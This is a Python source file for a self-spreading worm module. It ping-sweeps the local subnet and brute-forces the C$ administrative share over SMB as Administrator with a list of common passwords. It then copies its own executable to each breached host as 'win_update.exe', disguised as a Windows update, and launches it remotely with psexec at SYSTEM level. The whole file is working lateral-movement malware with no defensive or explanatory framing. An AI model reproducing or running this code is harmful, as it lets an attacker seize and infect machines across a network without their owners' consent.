"""
Network Spread Module
Scans and spreads across network
"""

import os
import socket
import subprocess
import logging
import time

class NetworkSpread:
    def __init__(self):
        self.local_ip = socket.gethostbyname(socket.gethostname())
        self.base_ip = ".".join(self.local_ip.split(".")[:3])
        self.common_passwords = [
            'password', 'admin', 'welcome', 'qwerty', 
            '123456', 'P@ssw0rd!', 'letmein'
        ]
        
        logging.info("[*] Network Spread initialized")
    
    def scan_and_spread(self):
        """Scan network and spread to vulnerable hosts"""
        hosts = self._scan_network()
        
        for host in hosts:
            self._attempt_spread(host)
        
        logging.info(f"[✓] Network spread attempted on {len(hosts)} hosts")
    
    def _scan_network(self):
        """Scan network for live hosts"""
        hosts = []
        
        for i in range(1, 255):
            ip = f"{self.base_ip}.{i}"
            
            # Skip self
            if ip == self.local_ip:
                continue
            
            # Ping to check if host is alive
            response = subprocess.run(
                ['ping', '-n', '1', '-w', '500', ip],
                capture_output=True,
                text=True
            )
            
            if response.returncode == 0:
                hosts.append(ip)
                logging.info(f"[*] Host found: {ip}")
            
            # Small delay to avoid network flooding
            time.sleep(0.05)
        
        return hosts
    
    def _attempt_spread(self, target_ip):
        """Attempt to spread to a target host"""
        
        # Try SMB authentication
        for password in self.common_passwords:
            try:
                # Attempt SMB connection
                command = f'net use \\\\{target_ip}\\C$ {password} /user:Administrator'
                result = subprocess.run(command, capture_output=True, text=True)
                
                if result.returncode == 0:
                    logging.info(f"[✓] Connected to {target_ip} with password: {password}")
                    self._copy_payload(target_ip)
                    break
            except:
                continue
    
    def _copy_payload(self, target_ip):
        """Copy payload to target"""
        try:
            # Copy payload to target
            source = sys.executable
            target_path = f"\\\\{target_ip}\\C$\\Users\\Public\\win_update.exe"
            
            if os.path.exists(source):
                subprocess.run(['copy', source, target_path], capture_output=True)
                logging.info(f"[✓] Payload copied to {target_ip}")
                
                # Execute on target (simplified)
                subprocess.run(['psexec', f"\\\\{target_ip}", '-s', '-d', target_path], capture_output=True)
                
        except Exception as e:
            logging.error(f"Payload copy failed: {e}")